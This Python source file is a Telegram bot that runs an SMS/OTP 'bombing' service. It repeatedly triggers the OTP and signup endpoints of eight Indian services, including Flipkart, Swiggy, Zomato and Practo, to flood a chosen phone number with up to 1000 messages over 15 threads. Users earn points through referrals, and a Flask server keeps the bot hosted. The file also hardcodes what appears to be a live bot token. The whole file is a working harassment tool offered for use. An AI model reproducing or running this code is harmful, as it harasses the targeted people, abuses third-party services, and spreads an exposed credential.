import os
import sys
import time
import random
import threading
import datetime
import requests
from flask import Flask
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes

# ==============================================
# ⚙️ CONFIG & DUAL ADMIN SETUP
# ==============================================
TOKEN = "8727210761:AAExnYPf8Twaud3umNGOtHQR-79MlZUsnmQ"  # Yahan apna token confirm kar lein
ADMIN_IDS = [8327651808, 8757231057]  
WELCOME_PHOTO = "pfp.jpg.jpeg"  

USERS_DB = {}  
PROTECTED_NUMBERS = {}  
GLOBAL_CONFIG = {"required_channel": ""}  
LAST_RESPONSE_MSG = {}

# ==============================================
# 🌐 FLASK SERVER FOR RENDER PORT BINDING
# ==============================================
web_app = Flask('')

@web_app.route('/')
def home():
    return "Bot is active and running 24x7!"

def run_web():
    port = int(os.environ.get('PORT', 10000))
    web_app.run(host='0.0.0.0', port=port)

# ==============================================
# 💥 ALL WORKING APIS (MASKED NAMES FOR SECURITY)
# ==============================================
class APIManager:
    @staticmethod
    def send_oyo(phone, cc):
        try:
            url = f"https://www.oyorooms.com/api/pwa/generateotp?country_code=%2B{cc}&nod=4&phone={phone}"
            r = requests.get(url, headers={'User-Agent': 'Mozilla/5.0'}, timeout=8)
            return r.status_code in [200, 201, 202]
        except: return False
    
    @staticmethod
    def send_flipkart(phone, cc):
        try:
            url = "https://www.flipkart.com/api/6/user/signup/status"
            data = {"loginId": [f"+{cc}{phone}"], "supportAllStates": True}
            r = requests.post(url, headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except: return False
    
    @staticmethod
    def send_pharmeasy(phone, cc):
        try:
            url = "https://pharmeasy.in/api/auth/requestOTP"
            data = {"contactNumber": phone}
            r = requests.post(url, headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except: return False
    
    @staticmethod
    def send_practo(phone, cc):
        try:
            url = "https://accounts.practo.com/send_otp"
            data = {'client_name': 'Practo Android App', 'mobile': f'+{cc}{phone}'}
            r = requests.post(url, headers={'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0'}, data=data, timeout=8)
            return "success" in r.text.lower() or r.status_code in [200, 201, 202]
        except: return False
    
    @staticmethod
    def send_goibibo(phone, cc):
        try:
            url = "https://www.goibibo.com/common/downloadsms/"
            data = {'mbl': phone}
            r = requests.post(url, headers={'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0'}, data=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except: return False
    
    @staticmethod
    def send_swiggy(phone, cc):
        try:
            url = "https://www.swiggy.com/mapi/auth/signup"
            data = {"name": "User", "email": "user@gmail.com", "password": "Pass@123", "mobile": phone}
            r = requests.post(url, headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except: return False
    
    @staticmethod
    def send_zomato(phone, cc):
        try:
            url = "https://www.zomato.com/webroutes/auth/login"
            data = {"country_id": 1, "phone": phone, "verification_type": "sms", "method": "phone"}
            r = requests.post(url, headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except: return False

    @staticmethod
    def send_bookmyshow(phone, cc):
        try:
            url = "https://in.bookmyshow.com/pwa/api/uapi/otp/send"
            data = {"channel": "phone", "subChannel": "sms", "details": {"phone": phone, "origin": "https://in.bookmyshow.com"}}
            r = requests.post(url, headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except: return False

ALL_APIS = [
    {"name": "OYO Rooms Gateway", "func": APIManager.send_oyo},
    {"name": "Flipkart Auth API", "func": APIManager.send_flipkart},
    {"name": "PharmEasy OTP Node", "func": APIManager.send_pharmeasy},
    {"name": "Practo Secure API", "func": APIManager.send_practo},
    {"name": "GoIbibo SMS Service", "func": APIManager.send_goibibo},
    {"name": "Swiggy Gateway", "func": APIManager.send_swiggy},
    {"name": "Zomato Auth Node", "func": APIManager.send_zomato},
    {"name": "BookMyShow OTP Hub", "func": APIManager.send_bookmyshow},
]

# ==============================================
# ⚙️ BOMBING ENGINE
# ==============================================
class BombingEngine:
    def __init__(self):
        self.active = {}
        self.counts = {}
        self.success = {}
        self.logs = []
        self.lock = threading.Lock()

    def clean_phone(self, phone):
        phone = ''.join(filter(str.isdigit, phone))
        if phone.startswith('91') and len(phone) > 10:
            phone = phone[2:]
        return phone

    def start_attack(self, phone, max_requests=1000, threads=15):
        phone = self.clean_phone(phone)
        if len(phone) != 10:
            return False, "⚠️ Invalid 10-digit phone number!"
        
        if phone in PROTECTED_NUMBERS:
            return False, "🛡️ Security Error: This number is PROTECTED against attacks!"
        
        if phone in self.active and self.active[phone]:
            return False, "⚡ Warning: Attack already active on target!"

        self.active[phone] = True
        self.counts[phone] = 0
        self.success[phone] = 0

        for _ in range(threads):
            threading.Thread(target=self._worker, args=(phone, max_requests), daemon=True).start()

        log_msg = f"🟢 [{datetime.datetime.now().strftime('%H:%M:%S')}] Target: +91 {phone} | Started"
        self.logs.append(log_msg)
        return True, f"🚀 MAXX ULTRA ATTACK LAUNCHED on +91 {phone} using {len(ALL_APIS)} APIs!"

    def _worker(self, phone, max_requests):
        cc = "91"
        api_list = ALL_APIS.copy()
        random.shuffle(api_list)
        while self.active.get(phone, False) and self.counts.get(phone, 0) < max_requests:
            if not api_list:
                api_list = ALL_APIS.copy()
                random.shuffle(api_list)
            api = random.choice(api_list)
            try:
                res = api["func"](phone, cc)
                with self.lock:
                    self.counts[phone] = self.counts.get(phone, 0) + 1
                    if res:
                        self.success[phone] = self.success.get(phone, 0) + 1
            except:
                with self.lock:
                    self.counts[phone] = self.counts.get(phone, 0) + 1
            time.sleep(0.2)

    def stop_attack(self, phone):
        phone = self.clean_phone(phone)
        if phone in self.active and self.active[phone]:
            self.active[phone] = False
            log_msg = f"🔴 [{datetime.datetime.now().strftime('%H:%M:%S')}] Target: +91 {phone} | Stopped"
            self.logs.append(log_msg)
            return True, f"🛑 Attack terminated for +91 {phone}."
        return False, "ℹ️ No active attack found."

    def get_status(self):
        return {p: {'count': self.counts.get(p, 0), 'success': self.success.get(p, 0)} for p, status in self.active.items() if status}

engine = BombingEngine()

# ==============================================
# 💎 PRO KEYBOARD LAYOUT
# ==============================================
def get_reply_keyboard(user_id):
    keyboard = [
        [KeyboardButton("🔥 Start Bombing"), KeyboardButton("🛑 Stop Attack")],
        [KeyboardButton("📊 Live Status"), KeyboardButton("🎁 Refer & Earn")],
        [KeyboardButton("🛡️ Protect Number"), KeyboardButton("🔌 Active APIs")],
        [KeyboardButton("⚡ Engine Speed"), KeyboardButton("📋 Attack Logs")],
        [KeyboardButton("⚙️ System Info")]
    ]
    if user_id in ADMIN_IDS:
        keyboard.append([KeyboardButton("👥 Total Users"), KeyboardButton("📢 Broadcast")])
        keyboard.append([KeyboardButton("📢 Channel Broadcast"), KeyboardButton("➕ Add Custom API")])
        keyboard.append([KeyboardButton("📢 Set Join Channel"), KeyboardButton("❌ Remove Join Channel")])
    
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def parse_channel_target(link_or_username):
    target = link_or_username.strip()
    if "t.me/joinchat/" in target or "+" in target:
        return target
    elif "t.me/" in target:
        parts = target.split("t.me/")
        ch = parts[1].split("/")[0]
        return f"@{ch}"
    return target

async def check_subscription(bot, user_id):
    req_ch = GLOBAL_CONFIG["required_channel"]
    if not req_ch:
        return True
    try:
        channel_to_check = parse_channel_target(req_ch)
        member = await bot.get_chat_member(chat_id=channel_to_check, user_id=user_id)
        if member.status in ['member', 'administrator', 'creator']:
            return True
    except:
        pass
    return False

async def show_welcome(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    
    if user_id not in USERS_DB:
        USERS_DB[user_id] = {"points": 4, "referred_by": None}
        if context.args:
            try:
                ref_id = int(context.args[0])
                if ref_id != user_id and ref_id in USERS_DB:
                    USERS_DB[user_id]["referred_by"] = ref_id
                    USERS_DB[ref_id]["points"] += 5
                    try:
                        await context.bot.send_message(chat_id=ref_id, text="🎉 *New Referral Successful!*\n\nYou received `+5 Points` for inviting a new user.", parse_mode="Markdown")
                    except:
                        pass
            except:
                pass

    req_ch = GLOBAL_CONFIG["required_channel"]
    if req_ch:
        is_joined = await check_subscription(context.bot, user_id)
        if not is_joined:
            keyboard = []
            ch_target = req_ch.strip()
            if "t.me/" in ch_target:
                keyboard.append([InlineKeyboardButton("📢 Join Channel", url=ch_target)])
            else:
                clean_ch = ch_target.replace('@', '')
                keyboard.append([InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{clean_ch}")])
                
            keyboard.append([InlineKeyboardButton("✅ I Have Joined", callback_data="check_join")])
            
            await context.bot.send_message(
                chat_id=chat_id,
                text="⚠️ *Access Denied!*\n\nYou must join our official channel first to use this bot.",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
            return

    user_pts = USERS_DB[user_id]["points"]
    role_str = "Admin 🛡️" if user_id in ADMIN_IDS else "Authorized User"
    welcome_text = (
        "╔═══════════════════════════════════╗\n"
        "║   🐉 *DROON ULTIMATE v5.0 MAXX* 🐉   ║\n"
        "╚═══════════════════════════════════╝\n\n"
        "✨ *CYBER LUXURY CONTROL PANEL*\n"
        "👤 *Developer:* `@K4xHERE`\n"
        f"👑 *Role:* `{role_str}`\n"
        f"💎 *Your Points:* `{user_pts} Points` *(2 Points = 1 Bomber Target)*\n\n"
        "👇 Use the permanent keyboard buttons below or commands:\n"
        "• `/bomb <10-digit-number>`\n"
        "• `/stop <10-digit-number>`\n"
        "• `/protect <number>`"
    )
    
    markup = get_reply_keyboard(user_id)
    
    try:
        photo_path = os.path.join(os.getcwd(), WELCOME_PHOTO)
        if os.path.exists(photo_path):
            with open(photo_path, 'rb') as photo:
                await context.bot.send_photo(chat_id=chat_id, photo=photo, caption=welcome_text, parse_mode="Markdown", reply_markup=markup)
        else:
            await context.bot.send_message(chat_id=chat_id, text=welcome_text, parse_mode="Markdown", reply_markup=markup)
    except Exception:
        await context.bot.send_message(chat_id=chat_id, text=welcome_text, parse_mode="Markdown", reply_markup=markup)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if update.message:
            await context.bot.delete_message(chat_id=update.effective_chat.id, message_id=update.message.message_id)
    except:
        pass
    await show_welcome(update, context)

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data == "check_join":
        user_id = query.from_user.id
        is_joined = await check_subscription(context.bot, user_id)
        if is_joined:
            try:
                await query.message.delete()
            except:
                pass
            await show_welcome(update, context)
        else:
            await query.answer("❌ You have not joined the channel yet!", show_alert=True)

async def update_dynamic_message(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    
    if GLOBAL_CONFIG["required_channel"]:
        is_joined = await check_subscription(context.bot, user_id)
        if not is_joined:
            await show_welcome(update, context)
            return

    try:
        if update.message:
            await context.bot.delete_message(chat_id=chat_id, message_id=update.message.message_id)
    except:
        pass
    
    if chat_id in LAST_RESPONSE_MSG:
        try:
            await context.bot.delete_message(chat_id=chat_id, message_id=LAST_RESPONSE_MSG[chat_id])
        except:
            pass
            
    sent_msg = await context.bot.send_message(
        chat_id=chat_id, 
        text=text, 
        parse_mode="Markdown", 
        reply_markup=get_reply_keyboard(user_id)
    )
    LAST_RESPONSE_MSG[chat_id] = sent_msg.message_id

async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    user_id = update.effective_user.id
    
    if text == "🔥 Start Bombing":
        await update_dynamic_message(update, context, "🔥 *To launch attack, type in chat:*\n`/bomb <10-digit-number>`\n*(Cost: 2 Points per Target)*")
    elif text == "🛑 Stop Attack":
        await update_dynamic_message(update, context, "🛑 *To terminate attack, type in chat:*\n`/stop <10-digit-number>`")
    elif text == "📊 Live Status":
        statuses = engine.get_status()
        msg = "📊 *Live Dashboard Metrics*\n\n" + ("\n".join([f"📱 `+91 {p}` ➔ Sent: `{d['count']}` | Success: `{d['success']}`" for p, d in statuses.items()]) if statuses else "ℹ️ No active attacks running.")
        await update_dynamic_message(update, context, msg)
    elif text == "🛡️ Protect Number":
        await update_dynamic_message(update, context, "🛡️ *Security Shield Protection*\n\nTo protect any number from attacks, type in chat:\n`/protect <10-digit-number>`")
    elif text == "🎁 Refer & Earn":
        bot_username = context.bot.username
        ref_link = f"https://t.me/{bot_username}?start={user_id}"
        user_pts = USERS_DB.get(user_id, {}).get("points", 4)
        msg = (
            "🎁 *Refer & Earn System*\n\n"
            f"💎 *Your Balance:* `{user_pts} Points`\n"
            "📌 *Rules:*\n"
            "• Get `+4 Points` instantly on joining.\n"
            "• Get `+5 Points` for every successful referral!\n"
            "• Cost per Bomber Target: `2 Points`\n\n"
            f"🔗 *Your Referral Link:*\n`{ref_link}`"
        )
        await update_dynamic_message(update, context, msg)
    elif text == "🔌 Active APIs":
        api_list = "\n".join([f"🔒 `{api['name']}` ➔ `[SECURE_ACTIVE]`" for api in ALL_APIS])
        msg = f"🔌 *Active Secure Bomber APIs*\nTotal Loaded: `{len(ALL_APIS)} Nodes`\n\n{api_list}"
        await update_dynamic_message(update, context, msg)
    elif text == "⚡ Engine Speed":
        msg = "⚡ *Engine Performance & Speed Test*\n\n• *Average Latency:* `0.24s`\n• *Throughput:* `~45 Requests/sec`\n• *Status:* `🚀 Optimal & Turbo Mode`"
        await update_dynamic_message(update, context, msg)
    elif text == "📋 Attack Logs":
        logs = engine.logs[-10:]
        msg = "📋 *System Attack Logs*\n\n```\n" + ("\n".join(logs) if logs else "No activity recorded.") + "\n```"
        await update_dynamic_message(update, context, msg)
    elif text == "⚙️ System Info":
        info = (
            "⚙️ *MAXX ULTRA CORE INFO*\n\n"
            "• *Developer:* `@K4xHERE`\n"
            "• *Version:* `5.0 STABLE CLOUD`\n"
            "• *Status:* `🟢 Online & Fully Operational`"
        )
        await update_dynamic_message(update, context, info)
    elif text == "👥 Total Users":
        if user_id not in ADMIN_IDS: return
        await update_dynamic_message(update, context, f"👥 *Total Bot Users Statistics*\n\n• *Unique Users Interacted:* `{len(USERS_DB)} Users`")
    elif text == "📢 Broadcast":
        if user_id not in ADMIN_IDS: return
        await update_dynamic_message(update, context, "📢 *Bot Users Broadcast Mode*\n\nSend your message using format:\n`/broadcast <your message>`")
    elif text == "📢 Channel Broadcast":
        if user_id not in ADMIN_IDS: return
        await update_dynamic_message(update, context, "📢 *Channel Broadcast Mode*\n\nSend your message using format:\n`/channelbroadcast <your message>`")
    elif text == "➕ Add Custom API":
        if user_id not in ADMIN_IDS: return
        await update_dynamic_message(update, context, "➕ *Add API Mode*\n\nTo add custom APIs, update endpoints directly in `bomber.py` under `APIManager`.")
    elif text == "📢 Set Join Channel":
        if user_id not in ADMIN_IDS: return
        await update_dynamic_message(update, context, "📢 *Set Channel Mode*\n\nSend command in chat:\n`/setchannel @Username` or paste full Invite Link.")
    elif text == "❌ Remove Join Channel":
        if user_id not in ADMIN_IDS: return
        GLOBAL_CONFIG["required_channel"] = ""
        await update_dynamic_message(update, context, "✅ *Join Channel Successfully Removed!*")

async def cmd_setchannel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ Unauthorized!")
        return
    if not context.args:
        await update.message.reply_text(f"Current Join Channel: `{GLOBAL_CONFIG['required_channel'] or 'None'}`\n\nUsage: `/setchannel @Username` or `/setchannel <InviteLink>`", parse_mode="Markdown")
        return
    GLOBAL_CONFIG["required_channel"] = " ".join(context.args)
    await update.message.reply_text(f"✅ Required Join Channel successfully set to: `{GLOBAL_CONFIG['required_channel']}`", parse_mode="Markdown")

async def cmd_removechannel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ Unauthorized!")
        return
    GLOBAL_CONFIG["required_channel"] = ""
    await update.message.reply_text("✅ *Join Channel Removed Successfully!*", parse_mode="Markdown")

async def cmd_protect(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update_dynamic_message(update, context, "❌ *Error:* Usage -> `/protect <10-digit-number>`")
        return
    phone = engine.clean_phone(context.args[0])
    if len(phone) != 10:
        await update_dynamic_message(update, context, "❌ *Error:* Please provide a valid 10-digit number.")
        return
    PROTECTED_NUMBERS[phone] = True
    await update_dynamic_message(update, context, f"🛡️ *Security Shield Activated!*\n\nNumber `+91 {phone}` has been successfully added to the **Protected List**.")

async def cmd_bomb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if GLOBAL_CONFIG["required_channel"] and not await check_subscription(context.bot, user_id):
        await show_welcome(update, context)
        return
        
    user_data = USERS_DB.get(user_id, {"points": 4})
    if user_data["points"] < 2:
        await update_dynamic_message(update, context, "❌ *Insufficient Points!*\n\nYou need at least `2 Points` to launch an attack. Use **🎁 Refer & Earn** to get more points.")
        return

    if not context.args:
        await update_dynamic_message(update, context, "❌ *Error:* Usage -> `/bomb <10-digit-number>`")
        return
        
    phone = context.args[0]
    success, msg = engine.start_attack(phone)
    if success:
        USERS_DB[user_id]["points"] -= 2
        msg += f"\n💎 *2 Points Deducted.* Remaining: `{USERS_DB[user_id]['points']} Points`"
        
    await update_dynamic_message(update, context, msg)

async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if GLOBAL_CONFIG["required_channel"] and not await check_subscription(context.bot, user_id):
        await show_welcome(update, context)
        return
    if not context.args:
        await update_dynamic_message(update, context, "❌ *Error:* Usage -> `/stop <10-digit-number>`")
        return
    phone = context.args[0]
    success, msg = engine.stop_attack(phone)
    await update_dynamic_message(update, context, msg)

async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if GLOBAL_CONFIG["required_channel"] and not await check_subscription(context.bot, user_id):
        await show_welcome(update, context)
        return
    statuses = engine.get_status()
    if not statuses:
        await update_dynamic_message(update, context, "📊 *Status Metrics:* No active attacks currently running.")
        return
    text = "📊 *Active Attack Metrics (MAXX):*\n\n"
    for p, d in statuses.items():
        text += f"📱 `+91 {p}`\n⚡ Requests: `{d['count']}` | ✅ Success: `{d['success']}`\n\n"
    await update_dynamic_message(update, context, text)

async def cmd_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ You are not authorized!")
        return
    if not context.args:
        await update.message.reply_text("❌ Usage: `/broadcast <message>`", parse_mode="Markdown")
        return
    
    broadcast_msg = " ".join(context.args)
    success_count = 0
    for uid in USERS_DB.keys():
        try:
            await context.bot.send_message(chat_id=uid, text=f"📢 *Announcement from Admin:*\n\n{broadcast_msg}", parse_mode="Markdown")
            success_count += 1
        except:
            pass
    await update.message.reply_text(f"✅ Bot Users Broadcast sent to `{success_count}` users.", parse_mode="Markdown")

async def cmd_channelbroadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ You are not authorized!")
        return
    req_ch = GLOBAL_CONFIG["required_channel"]
    if not req_ch:
        await update.message.reply_text("❌ No Join Channel is currently set! Use `/setchannel` first.")
        return
    if not context.args:
        await update.message.reply_text("❌ Usage: `/channelbroadcast <message>`", parse_mode="Markdown")
        return
    
    broadcast_msg = " ".join(context.args)
    try:
        ch_target = parse_channel_target(req_ch)
        await context.bot.send_message(chat_id=ch_target, text=f"📢 *Announcement:*\n\n{broadcast_msg}", parse_mode="Markdown")
        await update.message.reply_text("✅ Successfully published to the Channel!", parse_mode="Markdown")
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to publish to channel. Make sure bot is admin there.\nError: {e}")

def main():
    app = ApplicationBuilder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("bomb", cmd_bomb))
    app.add_handler(CommandHandler("stop", cmd_stop))
    app.add_handler(CommandHandler("status", cmd_status))
    app.add_handler(CommandHandler("protect", cmd_protect))
    app.add_handler(CommandHandler("broadcast", cmd_broadcast))
    app.add_handler(CommandHandler("channelbroadcast", cmd_channelbroadcast))
    app.add_handler(CommandHandler("setchannel", cmd_setchannel))
    app.add_handler(CommandHandler("removechannel", cmd_removechannel))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
    
    print("💎 Stable Cloud-Sync Bot (@K4xHERE) is live...")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    threading.Thread(target=run_web, daemon=True).start()
    main()
